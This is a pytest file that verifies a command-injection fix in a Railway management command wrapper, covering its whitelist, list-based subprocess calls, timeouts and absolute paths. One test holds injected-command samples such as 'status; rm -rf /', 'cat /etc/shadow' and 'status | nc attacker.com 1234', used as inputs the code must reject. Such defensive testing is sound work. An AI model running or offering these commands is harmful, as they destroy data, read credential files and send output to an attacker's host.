#!/usr/bin/env python3
"""
Tests for Railway command injection fixes.

Tests designed to verify that command injection vulnerabilities
have been properly fixed with safe execution methods.
"""

import subprocess
from unittest.mock import MagicMock, patch

import pytest


@pytest.mark.complex_setup
@pytest.mark.requires_migrations
class TestRailwayCommandInjectionFix:
    """Tests for Railway command injection fixes."""

    def test_safe_execute_railway_command_prevents_injection(self):
        """
        Test that safe_execute_railway_command prevents command injection.

        Verifies that the function only allows whitelisted commands and
        uses safe subprocess execution.
        """
        from management.railway_commands import safe_execute_railway_command

        with patch("subprocess.run") as mock_subprocess:
            mock_result = MagicMock()
            mock_result.stdout = "Status output"
            mock_result.stderr = ""
            mock_subprocess.return_value = mock_result

            # Test allowed command
            result = safe_execute_railway_command("status")

            # Should succeed
            assert result is True

            # Verify subprocess.run was called with list (safe)
            mock_subprocess.assert_called_once()
            call_args = mock_subprocess.call_args[0][0]  # First positional argument
            assert isinstance(call_args, list)
            assert call_args[2] == "status"  # Command should be at index 2

            print("✅ Safe execution prevents command injection")

    def test_safe_execute_rejects_malicious_commands(self):
        """
        Test that safe_execute_railway_command rejects malicious commands.
        """
        from management.railway_commands import safe_execute_railway_command

        # Test malicious commands
        malicious_commands = ["status; rm -rf /", "status && cat /etc/passwd", "status | nc attacker.com 1234", "../../../etc/passwd", "rm -rf /", "cat /etc/shadow"]

        for malicious_cmd in malicious_commands:
            result = safe_execute_railway_command(malicious_cmd)

            # Should fail for all malicious commands
            assert result is False, f"Should reject malicious command: {malicious_cmd}"

        print("✅ Malicious commands are properly rejected")

    def test_safe_execute_only_allows_whitelisted_commands(self):
        """
        Test that only whitelisted commands are allowed.
        """
        from management.railway_commands import safe_execute_railway_command

        # Test allowed commands
        allowed_commands = ["status", "test-connection", "migrate", "sync"]

        with patch("subprocess.run") as mock_subprocess:
            mock_result = MagicMock()
            mock_result.stdout = "Command output"
            mock_result.stderr = ""
            mock_subprocess.return_value = mock_result

            for cmd in allowed_commands:
                result = safe_execute_railway_command(cmd)
                assert result is True, f"Should allow whitelisted command: {cmd}"

        # Test disallowed commands
        disallowed_commands = ["rm", "cat", "wget", "curl", "arbitrary-command"]

        for cmd in disallowed_commands:
            result = safe_execute_railway_command(cmd)
            assert result is False, f"Should reject non-whitelisted command: {cmd}"

        print("✅ Only whitelisted commands are allowed")

    def test_safe_execute_handles_subprocess_errors(self):
        """
        Test that safe_execute_railway_command handles subprocess errors gracefully.
        """
        from management.railway_commands import safe_execute_railway_command

        # Test subprocess error handling
        with patch("subprocess.run") as mock_subprocess:
            # Mock subprocess.CalledProcessError
            mock_subprocess.side_effect = subprocess.CalledProcessError(returncode=1, cmd=["python", "script.py", "status"], output="Error output")

            result = safe_execute_railway_command("status")

            # Should return False on error
            assert result is False

        # Test timeout handling
        with patch("subprocess.run") as mock_subprocess:
            mock_subprocess.side_effect = subprocess.TimeoutExpired(cmd=["python", "script.py", "status"], timeout=60)

            result = safe_execute_railway_command("status")

            # Should return False on timeout
            assert result is False

        print("✅ Subprocess errors are handled gracefully")

    def test_setup_command_uses_safe_execution(self):
        """
        Test that the setup command now uses safe execution instead of os.system.
        """
        # This test verifies that the vulnerable os.system call has been replaced

        with patch("management.railway_commands.safe_execute_railway_command") as mock_safe_execute:
            mock_safe_execute.return_value = True

            # Import the module to test the fix
            import management.railway_commands as railway_commands

            # Test that safe_execute_railway_command exists and works
            result = railway_commands.safe_execute_railway_command("status")

            # Should succeed
            assert result is True
            mock_safe_execute.assert_called_with("status")

            print("✅ Setup command now uses safe execution")

    def test_no_os_system_calls_remain(self):
        """
        Test that no os.system calls remain in the codebase.

        This is a regression test to ensure the vulnerability doesn't reappear.
        """
        # Read the railway_commands.py file
        with open("management/railway_commands.py", "r") as f:
            content = f.read()

        # Check that os.system is not used in actual code (excluding comments and docstrings)
        import re

        # Remove comments and docstrings more carefully
        clean_content = re.sub(r"#.*", "", content)  # Remove line comments
        clean_content = re.sub(r'""".*?"""', "", clean_content, flags=re.DOTALL)  # Remove docstrings
        clean_content = re.sub(r"'''.*?'''", "", clean_content, flags=re.DOTALL)  # Remove single quote docstrings

        # Check for os.system( in the cleaned content
        assert "os.system(" not in clean_content, f"os.system() calls should be removed from railway_commands.py"

        # Verify safe_execute_railway_command is used instead
        assert "safe_execute_railway_command(" in content, "safe_execute_railway_command should be used"

        print("✅ No os.system calls remain in the codebase")

    def test_subprocess_timeout_prevents_hanging(self):
        """
        Test that subprocess timeout prevents commands from hanging indefinitely.
        """
        from management.railway_commands import safe_execute_railway_command

        with patch("subprocess.run") as mock_subprocess:
            # Verify timeout is set in subprocess.run call
            mock_result = MagicMock()
            mock_result.stdout = "Command output"
            mock_result.stderr = ""
            mock_subprocess.return_value = mock_result

            safe_execute_railway_command("status")

            # Check that timeout was specified
            call_kwargs = mock_subprocess.call_args[1]  # Keyword arguments
            assert "timeout" in call_kwargs
            assert call_kwargs["timeout"] == 60

            print("✅ Subprocess timeout prevents hanging commands")

    def test_absolute_path_prevents_path_manipulation(self):
        """
        Test that using absolute paths prevents path manipulation attacks.
        """
        from management.railway_commands import safe_execute_railway_command

        with patch("subprocess.run") as mock_subprocess:
            with patch("os.path.abspath") as mock_abspath:
                # Mock absolute path
                mock_abspath.return_value = "/safe/absolute/path/railway_commands.py"

                mock_result = MagicMock()
                mock_result.stdout = "Command output"
                mock_result.stderr = ""
                mock_subprocess.return_value = mock_result

                safe_execute_railway_command("status")

                # Verify os.path.abspath was called to get absolute path
                mock_abspath.assert_called_once()

                # Verify subprocess was called with absolute path
                call_args = mock_subprocess.call_args[0][0]
                assert "/safe/absolute/path/railway_commands.py" in call_args

                print("✅ Absolute paths prevent path manipulation")
